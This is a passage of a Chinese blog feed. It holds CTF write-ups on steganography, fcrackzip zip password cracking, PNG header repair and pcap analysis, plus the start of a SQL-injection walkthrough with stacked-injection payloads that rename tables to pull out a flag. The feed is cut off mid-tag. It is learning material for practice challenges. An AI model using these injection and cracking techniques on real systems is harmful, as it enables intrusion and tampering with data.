style="zoom:50%;"></p><p><strong>在改革年代，每个人都知道这条基本的准则：事后求谅解，比事前求许可要容易多了。</strong></p><p>《寻路中国》一书有几条不同的线索。它首先叙述了作者由东海之滨沿着长城一路向西，横跨中国北方的万里行程；另一条线索集中讲述了一个因中国汽车业的高速发展而发生巨变的乡村，在这里，作者特写了一个农民家庭由农而商的变化经历；最后，则是中国东南部一个工业小镇的城市生活场景。书中所描述的这种由农而工而商、乡村变身城市的发展，正是1978年改革以来中国所发生的最重要的变化。</p><h4 id="四世同堂"><a href="#四世同堂" class="headerlink" title="四世同堂"></a>四世同堂</h4><p><img src="/2022/12/15/读书分享II/5.jpeg" alt="5" style="zoom:50%;"></p><p><strong>只有一句话！到什么时候都不许灰心！人一灰心便只看到别人的错处，而看不到自己的消沉堕落！</strong></p><p>这是一部中国现代长篇小说经典名著，是老舍先生的代表作之一。小说在卢沟桥事变爆发、北平沦陷的时代背景下，以祁家四世同堂的生活为主线，形象、真切地描绘了以小羊圈胡同住户为代表的各个阶层、各色人等的荣辱浮沉、生死存亡。作品记叙了北平沦陷后的畸形世态中，日寇铁蹄下广大平民的悲惨遭遇，那一派古老、宁静生活被打破后的不安、惶惑与震撼，鞭挞了附敌作恶者的丑恶灵魂，揭露了日本军国主义的残暴罪行，更反映出百姓们面对强敌愤而反抗的英勇无畏，讴歌、弘扬了中国人民伟大的爱国主义精神和坚贞高尚的民族气节，史诗般地展现了第二次世界大战期间，中国人民为世界反法西斯战争做出的杰出贡献，气度恢弘，可歌可泣。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;朝花夕拾&quot;&gt;&lt;a href=&quot;#朝花夕拾&quot; class=&quot;headerlink&quot; title=&quot;朝花夕拾&quot;&gt;&lt;/a&gt;朝花夕拾&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2022/12/15/读书分享II/1.jpeg&quot; alt=&quot;1&quot; style=&quot;zoom:50%;&quot;
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>CTF Misc</title>
    <link href="elssm.github.io/2022/12/13/CTF-Misc/"/>
    <id>elssm.github.io/2022/12/13/CTF-Misc/</id>
    <published>2022-12-13T01:37:41.000Z</published>
    <updated>2022-12-15T08:22:51.640Z</updated>
    
    <content type="html"><![CDATA[<h4 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h4><p>zip下载后有一张gif，直接拖入到StegSolve中分帧查看，得到flag</p><p><img src="/2022/12/13/CTF-Misc/1.png" alt="1"></p><p><img src="/2022/12/13/CTF-Misc/2.png" alt="2"></p><p><img src="/2022/12/13/CTF-Misc/3.png" alt="3"></p><p><img src="/2022/12/13/CTF-Misc/4.png" alt="4"></p><h4 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h4><p>下载之后是一个png图片，使用<code>hex fiend</code>打开之后发现里面有一个<code>number.txt</code>文件</p><p><img src="/2022/12/13/CTF-Misc/5.png" alt="5"></p><p>接着使用<code>foremost</code>分离文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost QR_code.png</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: QR_code.png</span><br><span class="line">�foundat=4number.txtn</span><br><span class="line">Qjxu�J����[����OPF4L�</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>查看输出，里面有一个zip文件，打开里面有一个<code>4number.txt</code>文件，需要一个四位密码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % tree output</span><br><span class="line">output</span><br><span class="line">├── audit.txt</span><br><span class="line">├── png</span><br><span class="line">│   └── 00000000.png</span><br><span class="line">└── zip</span><br><span class="line">    └── 00000000.zip</span><br><span class="line"></span><br><span class="line">2 directories, 3 files</span><br></pre></td></tr></table></figure><p>使用<code>fcrackzip</code>开始破解密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % fcrackzip -b -c '1' -l 4 -u 00000000.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == 7639</span><br></pre></td></tr></table></figure><h4 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h4><p>zip解压后是一张图片，丢到StegSolve中进行文件格式分析。直接获取到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/6.png" alt="6"></p><h4 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h4><p>zip下载后发现打不开图片，<code>StegSolve</code>打开后发现图片少了一半。</p><p><img src="/2022/12/13/CTF-Misc/7.png" alt="7"></p><p>对于一个 PNG 文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。具体格式如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PNG文件头部格式如下：</span><br><span class="line"></span><br><span class="line">- （固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line">- （固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line">- （固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）</span><br><span class="line">- （可变）13字节数据块（IHDR)</span><br><span class="line">    - 前四个字节代表该图片的宽</span><br><span class="line">    - 后四个字节代表该图片的高</span><br><span class="line">    - 后五个字节依次为：</span><br><span class="line">    Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line">- （可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七字节进行crc计算得到。</span><br></pre></td></tr></table></figure><p><code>hex fiend</code>打开图片如下。</p><p><img src="/2022/12/13/CTF-Misc/8.png" alt="8"></p><p>因此从图片上可以看到<code>crc</code>校验码为<code>0x6D7C7135</code></p><p>尝试对图片的高度进行修复，需要注意的是，文件宽度不能任意修改，需要根据IHDR块的CRC值爆破得到宽度, 否则图片显示错误不能得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">misc = open(<span class="string">"dabai.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">'&gt;i'</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0x6d7c7135</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><p>得到高度为479，十六进制为<code>0x01df</code></p><p>随后我们在<code>hex fiend</code>中对图片的高度进行修改，修改后打开图片看到<code>flag</code>。</p><p><img src="/2022/12/13/CTF-Misc/9.png" alt="9"></p><h4 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h4><p>下载下来是一个<code>key.exe</code>，拖到<code>hex fiend</code>查看发现是<code>imagebase64</code>格式</p><p><img src="/2022/12/13/CTF-Misc/10.png" alt="10"></p><p>解码后扫描二维码获取<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/11.png" alt="11"></p><h4 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h4><p><code>hex fiend</code>打开图片拖到最后面看到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/12.png" alt="12"></p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>wireshark打开下载到的<code>pcap</code>文件，根据题目提示登录密码即为<code>flag</code>，过滤<code>POST</code>请求获取<code>flag</code>。</p><p><img src="/2022/12/13/CTF-Misc/13.png" alt="13"></p><h4 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h4><p><code>StegSolve</code>打开图片，在不同通道中切换查看图片，发现<code>blue0,green0,red0</code>和原始图片不一样</p><p><img src="/2022/12/13/CTF-Misc/14.png" alt="14"></p><p><img src="/2022/12/13/CTF-Misc/15.png" alt="15"></p><p><img src="/2022/12/13/CTF-Misc/16.png" alt="16"></p><p><img src="/2022/12/13/CTF-Misc/17.png" alt="17"></p><p>使用<code>Data Extract</code>功能进行提取，保存成图片，发现是二维码，扫描后获取到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/18.png" alt="18"></p><h4 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h4><p>下载后发现文件加密，看到题目提示是zip伪加密，因此不需要使用<code>fcrack</code>爆破。首先了解一下zip文件。</p><p>一个zip文件由三部分组成</p><ul><li>压缩源文件数据区</li><li>压缩源文件目录区</li><li>压缩源文件目录结束标志</li></ul><p>具体组成如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件数据区： </span><br><span class="line">    50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line">    14 00：解压文件所需 pkware 版本 </span><br><span class="line">    00 00：全局方式位标记（有无加密） </span><br><span class="line">    08 00：压缩方式 </span><br><span class="line">    5A 7E：最后修改文件时间 </span><br><span class="line">    F7 46：最后修改文件日期 </span><br><span class="line">    16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">    19 00 00 00：压缩后尺寸（25） </span><br><span class="line">    17 00 00 00：未压缩尺寸（23） </span><br><span class="line">    07 00：文件名长度 </span><br><span class="line">    00 00：扩展记录长度 </span><br><span class="line"></span><br><span class="line">压缩源文件目录区： </span><br><span class="line">    50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line">    3F 00：压缩使用的 pkware 版本 </span><br><span class="line">    14 00：解压文件所需 pkware 版本 </span><br><span class="line">    00 00：全局方式位标记</span><br><span class="line">    08 00：压缩方式 </span><br><span class="line">    5A 7E：最后修改文件时间 </span><br><span class="line">    F7 46：最后修改文件日期 </span><br><span class="line">    16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">    19 00 00 00：压缩后尺寸（25） </span><br><span class="line">    17 00 00 00：未压缩尺寸（23） </span><br><span class="line">    07 00：文件名长度 </span><br><span class="line">    24 00：扩展字段长度 </span><br><span class="line">    00 00：文件注释长度 </span><br><span class="line">    00 00：磁盘开始号 </span><br><span class="line">    00 00：内部文件属性 </span><br><span class="line">    20 00 00 00：外部文件属性 </span><br><span class="line">    00 00 00 00：局部头部偏移量 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">压缩源文件目录结束标志： </span><br><span class="line">    50 4B 05 06：目录结束标记 </span><br><span class="line">    00 00：当前磁盘编号 </span><br><span class="line">    00 00：目录区开始磁盘编号 </span><br><span class="line">    01 00：本磁盘上纪录总数 </span><br><span class="line">    01 00：目录区中纪录总数 </span><br><span class="line">    59 00 00 00：目录区尺寸大小 </span><br><span class="line">    3E 00 00 00：目录区对第一张磁盘的偏移量 </span><br><span class="line">    00 00：ZIP 文件注释长度</span><br></pre></td></tr></table></figure><p>因此我们通过<code>hex fiend</code>打开zip文件可以发现。压缩源文件数据区的全局方式位标记为<code>0900</code>,压缩源文件目录区的全局方式位标记为<code>0900</code>，而对于<code>zip</code>伪加密文件，我们只需要将<strong>压缩源文件数据区和压缩源文件目录区</strong>的全局方式位标记从<code>0900</code>或者<code>0100</code>修改为<code>0000</code>就可以移除密码，反之则可以添加密码。</p><p><img src="/2022/12/13/CTF-Misc/19.png" alt="19"></p><h4 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h4><p>wireshark打开过滤post请求，发现有一个jepg格式的照片，打开查看。</p><p><img src="/2022/12/13/CTF-Misc/20.png" alt="20"></p><p>获取到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/21.png" alt="21"></p><h4 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h4><p><code>StegSolve</code>打开图片，在不同通道中切换查看图片，发现<code>blue0,green0,red0</code>和原始图片不一样</p><p><code>data extract</code>获取<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/22.png" alt="22"></p><h4 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h4><p><code>binwalk</code>分析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">38689         0x9721          Zip archive data, encrypted at least v2.0 to extract, compressed size: 50, uncompressed size: 38, name: ningen.txt</span><br><span class="line">38871         0x97D7          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>发现存在zip文件。foremost分离</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line">|foundat=ningen.txt|���B��W��u���:)�ם[Rk�3�_��W�i�&#125;Ćne%�3�]��BPK?</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>zip下有一个<code>ningen.txt</code>文件，但是被加密了，由题目可知是四位数密码，fcrack爆破获取<code>flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % fcrackzip -b -c '1' -l 4 -u output/zip/00000075.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw == 8368</span><br></pre></td></tr></table></figure><h4 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h4><p>追踪tcp数据流获取flag</p><p><img src="/2022/12/13/CTF-Misc/23.png" alt="23"></p><h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><p>图片下载下来binwalk查看发现存在压缩文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk 42011487927629132.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 664 x 586, 8-bit/color RGB, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, default compression</span><br></pre></td></tr></table></figure><p>stegsolve最低位分析，根据标识头发现是zip文件</p><p><img src="/2022/12/13/CTF-Misc/24.png" alt="24"></p><p>修改下载下来的图片后缀为zip并解压，发现里面存在一个1的文件，查看文件属性发现是可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % file 1</span><br><span class="line">1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=8df45089fa39fec83423ec37a944e81065d16bee, not stripped</span><br></pre></td></tr></table></figure><p><code>Ghidra</code>打开反编译后看到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/25.png" alt="25"></p><h4 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h4><p>下载图片后追踪http流，发现有一串base64编码数据，以<code>/9j/</code>开头，属于图片格式，直接base64转图片，看到flag</p><p><img src="/2022/12/13/CTF-Misc/26.png" alt="26"></p><p><img src="/2022/12/13/CTF-Misc/27.png" alt="27"></p><h4 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h4><p>Audacity打开发现存在摩斯电码，解密得到flag</p><p><img src="/2022/12/13/CTF-Misc/28.png" alt="28"></p><h4 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h4><p>下载图片后<code>binwalk</code>分析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk snake.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">2925          0xB6D           Copyright string: "Copyright Apple Inc., 2015"</span><br><span class="line">278260        0x43EF4         Zip archive data, at least v1.0 to extract, compressed size: 82, uncompressed size: 82, name: key</span><br><span class="line">278375        0x43F67         Zip archive data, at least v1.0 to extract, compressed size: 48, uncompressed size: 48, name: cipher</span><br><span class="line">278632        0x44068         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>修改后缀后解压</p><p>发现有俩文件一个<code>cipher</code>一个<code>key</code>，将<code>key</code>用<code>hex fiend</code>打开发现一串<code>base64</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</span><br></pre></td></tr></table></figure><p>解码结果为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is Nicki Minaj's favorite song that refers to snakes?</span><br></pre></td></tr></table></figure><p><code>google</code>搜索这个人和蛇有关的歌曲，名为<code>anaconda</code></p><p><img src="/2022/12/13/CTF-Misc/29.png" alt="29"></p><p>加密算法是什么呢？百思不得其解，网上查了后发现蛇还有个英文名叫<code>Serpent</code>正好也对应一个加密算法。。。</p><p><code>serpent</code>在线加解密：<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p>得到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/30.png" alt="30"></p><h4 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h4><p>下载后发现zip是伪加密，直接修改后打开，里面一张照片一个文件，文件内容如下</p><p><img src="/2022/12/13/CTF-Misc/31.png" alt="31"></p><p>没看明白啥意思，图片我<code>binwalk hexfiend stegsolve</code>都无果</p><p>看了writeup后知道了一个网站。。。。</p><p>与佛论禅：<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">https://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p>得到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/32.png" alt="32"></p><h4 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h4><p>下载文件后直接wireshark打开，根据题目应该是POST请求，直接过滤post请求</p><p><img src="/2022/12/13/CTF-Misc/33.png" alt="33"></p><p>过滤之后追踪http请求流，发现了两段可以的请求</p><p>第一段post参数有<code>z1</code>和<code>z2</code></p><p><img src="/2022/12/13/CTF-Misc/34.png" alt="34"></p><p>将<code>z1 base64</code>解码得到一个图片地址</p><p><img src="/2022/12/13/CTF-Misc/36.png" alt="36"></p><p><code>z2</code>是很长的一段16进制hex码，以<code>FFD8</code>开头以<code>FFD9</code>结尾，可以判断出是<code>jpeg</code>图片格式的开头和结尾，于是找一个在线网站直接转换</p><p>hexadecimal-&gt;image:<a href="https://codepen.io/abdhass/full/jdRNdj" target="_blank" rel="noopener">https://codepen.io/abdhass/full/jdRNdj</a></p><p><img src="/2022/12/13/CTF-Misc/37.png" alt="37"></p><p>第二段post请求中存在其他文件</p><p><img src="/2022/12/13/CTF-Misc/35.png" alt="35"></p><p><code>foremost</code>分离</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost 666666.pcapng</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: 666666.pcapng</span><br><span class="line">|foundat=flag.txtC����cS�J��Ea�v�</span><br><span class="line">                                 ��&amp;e$K��2%�$��,�=�J��1p��p46PK?</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>输入上面图片中的密码，拿到<code>flag</code></p><h4 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h4><p>两张gif图，第二张副本图片损毁了，<code>hex fiend</code>打开后发现缺少<code>gif</code>头，标识为<code>47 49 46 38</code>，添加<code>gif</code>头后可以正常打开，看到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;金三胖&quot;&gt;&lt;a href=&quot;#金三胖&quot; class=&quot;headerlink&quot; title=&quot;金三胖&quot;&gt;&lt;/a&gt;金三胖&lt;/h4&gt;&lt;p&gt;zip下载后有一张gif，直接拖入到StegSolve中分帧查看，得到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/12/
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF SQL WriteUp</title>
    <link href="elssm.github.io/2022/12/07/CTF-SQL-WriteUp/"/>
    <id>elssm.github.io/2022/12/07/CTF-SQL-WriteUp/</id>
    <published>2022-12-07T02:46:49.000Z</published>
    <updated>2022-12-13T01:46:05.936Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ctf sql注入学习</p><p>题目地址：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>启动靶机输入1，回显如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/1.png" alt="1"></p><p>输入<code>1&#39;</code>，回显如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/2.png" alt="1"></p><p>输入<code>1&#39;#</code>，回显如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/3.png" alt="1"></p><p>发现存在sql注入，进而使用<code>order by</code>爆列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 1;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>无报错</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/4.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 2;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>无报错</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/5.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 3;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>报错</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/6.png" alt="1"></p><p>因此字段有两列。</p><p>使用，<code>union select</code>回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现有正则表达式进行过滤</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/7.png" alt="1"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>转向堆叠注入</p><p>查看数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/8.png" alt="1"></p><p>查看表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现有两张表，分别是<code>1919810931114514</code>和<code>words</code></p><p><img src="/2022/12/07/CTF-SQL-WriteUp/9.png" alt="1"></p><p>获取每张表的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/10.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/11.png" alt="1"></p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>根据两张表的字段数可以判断出输入框查询的是<code>words</code>表。</p><p>因此我们的思路是将<code>1919810931114514</code>表名改为<code>words</code>表，再将表中的<code>flag</code>字段改为<code>id</code>字段后再次进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> words2;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>修改后查看是否修改成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现已经修改成功</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/12.png" alt="1"></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>查看flag</p><figure class="highlight sql"><table><tr><td 